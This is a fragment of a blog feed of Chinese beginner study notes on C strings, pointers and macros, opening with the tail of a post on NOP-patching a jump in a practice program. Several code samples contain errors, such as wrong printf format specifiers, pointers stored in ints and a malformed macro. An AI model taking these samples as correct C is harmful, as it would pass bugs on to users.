title="滑板指令"></a>滑板指令</h3><p>使用nop（没有作用的指令）把跳转改掉</p><p>还是刚才那个程序，修改结果如下：</p><p><img src="image-20200516230516330.png" alt="image-20200516230516330"></p><p>执行完，打印出success！这里就不放图了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;逆向基础01–初见逆向&quot;&gt;&lt;a href=&quot;#逆向基础01–初见逆向&quot; class=&quot;headerlink&quot; title=&quot;逆向基础01–初见逆向&quot;&gt;&lt;/a&gt;逆向基础01–初见逆向&lt;/h1&gt;&lt;p&gt;在使用VS2015生成解决方案的时候，有两个版本：&lt;/p&gt;
&lt;p&gt;&lt;
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="逆向入门学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>C语言基础05--字符串操作</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8005--%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8005--%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C/</id>
    <published>2020-05-16T07:40:50.000Z</published>
    <updated>2020-05-28T01:50:38.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言基础05–字符串操作"><a href="#C语言基础05–字符串操作" class="headerlink" title="C语言基础05–字符串操作"></a>C语言基础05–字符串操作</h1><h3 id="字符串的声明"><a href="#字符串的声明" class="headerlink" title="字符串的声明"></a>字符串的声明</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//字符串的声明可以用3钟方法</span></span><br><span class="line"><span class="comment">//在c/c++里，字符串以00结尾，第一种方式声明会自动在字符串末尾加00</span></span><br><span class="line"><span class="keyword">char</span> str[] = &#123; <span class="string">"hello"</span> &#125;;</span><br><span class="line"><span class="comment">//第二种方式声明需要手动添加\0</span></span><br><span class="line"><span class="keyword">char</span> str1[] = &#123; <span class="string">'h'</span>,<span class="string">'e'</span>,<span class="string">'l'</span>,<span class="string">'l'</span>,<span class="string">'o'</span>,<span class="string">'\0'</span> &#125;;</span><br><span class="line"><span class="comment">//第三种方式声明和声明数组是一样的</span></span><br><span class="line"><span class="keyword">char</span> * str2 = <span class="string">"hello"</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s,%s,%s"</span>, str, str1, str2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串的输入"><a href="#字符串的输入" class="headerlink" title="字符串的输入"></a>字符串的输入</h3><p>3种方法从控制台接收字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//三种从控制台获取输入的途径：gets/fgets/scanf</span></span><br><span class="line"><span class="keyword">char</span> str[<span class="number">50</span>];</span><br><span class="line"><span class="comment">//gets 默认以回车的方式结束输入</span></span><br><span class="line"><span class="comment">//gets(str);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//fgets接收3个参数，存放字符串的位置，接收字符串的长度，接收模式    与gets的区别在于会接收回车，能控制接收大小</span></span><br><span class="line"><span class="comment">//fgets(str,50,stdin);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//scanf通过格式化输入来控制输入长度</span></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%5s"</span>, &amp;str);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>, str);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串的输出"><a href="#字符串的输出" class="headerlink" title="字符串的输出"></a>字符串的输出</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> str[] = &#123;<span class="string">"hello\n"</span>&#125;;</span><br><span class="line"><span class="comment">//两种方式：puts printf</span></span><br><span class="line"><span class="built_in">puts</span>(str);<span class="comment">//自带换行</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, str);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="计算字符串长度"><a href="#计算字符串长度" class="headerlink" title="计算字符串长度"></a>计算字符串长度</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="comment">//字符串操作一般都包含进去，会用得上</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//字符串以00或者\0结尾，真实长度比输出来的长度要多1</span></span><br><span class="line"><span class="keyword">char</span> str[] = &#123;<span class="string">"hello"</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> a = <span class="built_in">strlen</span>(str);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a=%d"</span>, a);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//字符串拼接的两个函数：strcat,strncat</span></span><br><span class="line"><span class="comment">//strcat接收两个参数：目的字符串，源字符串，将源字符串拷贝到目的字符串后面，存到目的字符串里</span></span><br><span class="line"><span class="comment">//strncat接收三个参数：目的字符串，源字符串，接收长度，将指定长度的源字符串拷贝到目的字符串后面，存到目的字符串里</span></span><br><span class="line"><span class="keyword">char</span> str1[] = <span class="string">"hello "</span>;</span><br><span class="line"><span class="keyword">char</span> str2[] = <span class="string">"world \n"</span>;</span><br><span class="line"><span class="comment">//strcat(str1, str2);</span></span><br><span class="line"><span class="comment">//printf("%s", str1);</span></span><br><span class="line"><span class="built_in">strncat</span>(str1, str2,<span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>, str1);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串对比"><a href="#字符串对比" class="headerlink" title="字符串对比"></a>字符串对比</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//strcmp strcnmp</span></span><br><span class="line"><span class="comment">//strcmp接收两个参数：待比较的两个字符串，返回0表示相等，返回其他值表示不相等</span></span><br><span class="line"><span class="comment">//strncmp接收三个参数，待比较的两个字符串和比对的字符数（从头往后数）,返回值同上</span></span><br><span class="line"><span class="keyword">char</span> str1[] = <span class="string">"hello"</span>;</span><br><span class="line"><span class="keyword">char</span> str2[] = <span class="string">"hello world"</span>;</span><br><span class="line"><span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//res = strcmp(str1, str2);//-1</span></span><br><span class="line">res = <span class="built_in">strncmp</span>(str1, str2, <span class="number">5</span>);<span class="comment">//0</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, res);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串拷贝"><a href="#字符串拷贝" class="headerlink" title="字符串拷贝"></a>字符串拷贝</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//strcpy strncpy</span></span><br><span class="line"><span class="comment">//strcpy接收两个参数：目的字符串和源字符串，将源字符串的东西拷贝到目的字符串里</span></span><br><span class="line"><span class="comment">//strncpy比上面多接收一个参数，拷贝的字符数</span></span><br><span class="line"><span class="keyword">char</span> str1[<span class="number">30</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//这里需要用0初始化，因为字符串找到0才结尾，打印的时候会出现烫烫烫烫烫烫</span></span><br><span class="line"><span class="keyword">char</span> str2[] = <span class="string">"hello world"</span>;</span><br><span class="line"><span class="comment">//strcpy(str1, str2);</span></span><br><span class="line"><span class="built_in">strncpy</span>(str1, str2,<span class="number">5</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>, str1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串格式化"><a href="#字符串格式化" class="headerlink" title="字符串格式化"></a>字符串格式化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//sprintf：将printf格式化输出的结果保存到字符串里</span></span><br><span class="line"><span class="comment">//接收三个参数，一个是目标字符串，2是格式化格式，3是格式化内容</span></span><br><span class="line"><span class="keyword">char</span> str[] = &#123;<span class="string">"hello"</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s,%d\n"</span>, str, n);</span><br><span class="line"><span class="keyword">char</span> str0[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">sprintf</span>(str0, <span class="string">"%s,%d\n"</span>, str, n);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,str0);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//两个输出是一样的</span></span><br></pre></td></tr></table></figure><h3 id="动态内存管理"><a href="#动态内存管理" class="headerlink" title="动态内存管理"></a>动态内存管理</h3><p>三步骤：</p><ol><li>申请内存  malloc,memset</li><li>使用内存  </li><li>释放内存  free</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> * str;</span><br><span class="line"><span class="comment">//malloc在堆上面申请内存，返回的是void *</span></span><br><span class="line">str = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">200</span> * <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line"><span class="comment">//memset,把一段内存地址刷成你想要的的值</span></span><br><span class="line"><span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="number">200</span> * <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line"><span class="built_in">strcpy</span>(str, <span class="string">"asdjaljfalkjas"</span>);</span><br><span class="line"><span class="comment">//free 释放内存</span></span><br><span class="line"><span class="built_in">free</span>(str);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C语言基础05–字符串操作&quot;&gt;&lt;a href=&quot;#C语言基础05–字符串操作&quot; class=&quot;headerlink&quot; title=&quot;C语言基础05–字符串操作&quot;&gt;&lt;/a&gt;C语言基础05–字符串操作&lt;/h1&gt;&lt;h3 id=&quot;字符串的声明&quot;&gt;&lt;a href=&quot;#字符串
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="C语言学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>C语言基础04--指针</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8004--%E6%8C%87%E9%92%88/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8004--%E6%8C%87%E9%92%88/</id>
    <published>2020-05-16T02:40:50.000Z</published>
    <updated>2020-05-16T16:52:11.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言基础04–指针"><a href="#C语言基础04–指针" class="headerlink" title="C语言基础04–指针"></a>C语言基础04–指针</h1><h3 id="指针与变量之间的关系"><a href="#指针与变量之间的关系" class="headerlink" title="指针与变量之间的关系"></a>指针与变量之间的关系</h3><p>*：指针运算符，跟在变量前表示指向地址的值</p><p>&amp;：取地址运算符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">int</span> * b = &amp;a; <span class="comment">//指什么类型的地址，声明什么类型的指针</span></span><br><span class="line">  <span class="comment">//这里是把a的地址给b</span></span><br><span class="line">*b = <span class="number">666</span>;</span><br><span class="line"><span class="comment">//a指的是地址上的值</span></span><br><span class="line"><span class="comment">//b指的是地址</span></span><br><span class="line"><span class="comment">//&amp;a指的是地址</span></span><br><span class="line"><span class="comment">//*b指的是地址上的值</span></span><br><span class="line">a = <span class="number">567</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在汇编中</span></span><br><span class="line"><span class="comment">//mov dword ptr [a] ,2F6ah</span></span><br><span class="line"><span class="comment">//dword 是数据长度，4字节</span></span><br><span class="line"><span class="comment">//ptr 指针</span></span><br><span class="line"><span class="comment">//a    a的地址</span></span><br><span class="line"><span class="comment">//[a]  a的值</span></span><br></pre></td></tr></table></figure><h3 id="指针与数组"><a href="#指针与数组" class="headerlink" title="指针与数组"></a>指针与数组</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//数组是内存地址中连续的存储空间</span></span><br><span class="line"><span class="comment">//数组的名字指向数组首地址</span></span><br><span class="line"><span class="keyword">int</span> n[<span class="number">5</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> * a = n;<span class="comment">//a就是数组首地址，*a的值为1</span></span><br><span class="line"><span class="keyword">int</span> b = *(a + <span class="number">1</span>);<span class="comment">//这里+1指的是+1个int类型的长度</span></span><br><span class="line"> <span class="comment">//(a+1)相当于是数组下一位的地址，然后前面跟上*来取地址的值</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="指针与函数"><a href="#指针与函数" class="headerlink" title="指针与函数"></a>指针与函数</h3><h4 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//指针函数是函数,指针类型的函数，返回值也是指针</span></span><br><span class="line"><span class="comment">//函数指针是指针，指向函数的指针</span></span><br><span class="line"><span class="keyword">int</span>(*mysub)(<span class="keyword">int</span> a, <span class="keyword">int</span> b);<span class="comment">//函数指针</span></span><br><span class="line">mysub = sub;<span class="comment">//不带括号不带参数的函数名是函数的首地址</span></span><br><span class="line"><span class="keyword">int</span> c = mysub(<span class="number">2</span>,<span class="number">1</span>);</span><br><span class="line"><span class="comment">// 调用的时候，mysub指向跳转表的sub，然后跳转表指向函数的sub</span></span><br><span class="line"><span class="keyword">int</span> d = sub(<span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line"><span class="comment">// 调用的时候，sub也先指向跳转表的sub，然后跳转表指向函数sub</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> a - b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="指针函数"><a href="#指针函数" class="headerlink" title="指针函数"></a>指针函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> * <span class="title">ret</span><span class="params">(<span class="keyword">int</span> * a)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> b[<span class="number">3</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> a = &amp;b[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> * c = ret(a);<span class="comment">//这里的c是地址，是a的地址,也就是把函数返回的地址给c</span></span><br><span class="line"><span class="keyword">int</span> d = *c;<span class="comment">//*c是a的地址的值</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> * <span class="title">ret</span><span class="params">(<span class="keyword">int</span> * a)</span> </span>&#123;<span class="comment">//传入一个地址作为参数</span></span><br><span class="line"><span class="keyword">int</span> b = a;<span class="comment">//a为地址</span></span><br><span class="line"><span class="keyword">int</span> c = *a;<span class="comment">//*a为a的值</span></span><br><span class="line"><span class="keyword">return</span> a;<span class="comment">//返回的是a的地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C语言基础04–指针&quot;&gt;&lt;a href=&quot;#C语言基础04–指针&quot; class=&quot;headerlink&quot; title=&quot;C语言基础04–指针&quot;&gt;&lt;/a&gt;C语言基础04–指针&lt;/h1&gt;&lt;h3 id=&quot;指针与变量之间的关系&quot;&gt;&lt;a href=&quot;#指针与变量之间的关系&quot;
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="C语言学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>C语言基础03--宏&amp;函数&amp;数组</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8003--%E5%AE%8F&amp;%E5%87%BD%E6%95%B0&amp;%E6%95%B0%E7%BB%84/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8003--%E5%AE%8F&amp;%E5%87%BD%E6%95%B0&amp;%E6%95%B0%E7%BB%84/</id>
    <published>2020-05-16T00:40:50.000Z</published>
    <updated>2020-05-16T16:52:08.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言基础03–宏-amp-函数-amp-数组"><a href="#C语言基础03–宏-amp-函数-amp-数组" class="headerlink" title="C语言基础03–宏&amp;函数&amp;数组"></a>C语言基础03–宏&amp;函数&amp;数组</h1><h3 id="宏"><a href="#宏" class="headerlink" title="宏"></a>宏</h3><p>预先定义一个东西，编译的时候被替换掉，有点常量的感觉</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> nNUm = 10; <span class="comment">//宏，类似于常量，无参数宏</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> add (a+b); <span class="comment">//表达式，无参数宏</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max(a,b) ((a&gt;b)?(a):(b)) <span class="comment">//三元运算符，有参数宏</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">1</span>;</span><br><span 